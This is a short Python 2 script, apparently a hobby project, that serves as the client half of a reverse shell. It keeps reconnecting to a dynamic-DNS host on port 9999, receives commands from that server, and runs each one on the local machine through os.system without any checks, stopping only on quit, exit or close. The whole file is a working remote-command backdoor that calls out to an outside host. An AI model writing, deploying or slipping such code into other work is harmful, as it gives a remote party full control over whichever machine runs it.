#Client.py
import socket
import os
import time
import sys
import subprocess
# Points to external IP on my network, router forwards 9999 data to my server.
host = "projectice100.ddns.net"
port = 9999

while 1:
    s = socket.socket()          # Create a socket object

    while 1:
        try:
            s.connect((host, port))      # Connect to server
            print "Connected to", host, "on", port
            break

        except:
            pass

    while True:
        try:
            cmd = s.recv(1024)          # receive data from server
            print cmd
            if (cmd  == "quit" or cmd == "exit" or cmd == "close"):
                s.close()
                print "Connection closed by server."

            else:
                os.system(cmd)

        except:
            print "Connection closed by client."
            os._exit(1)
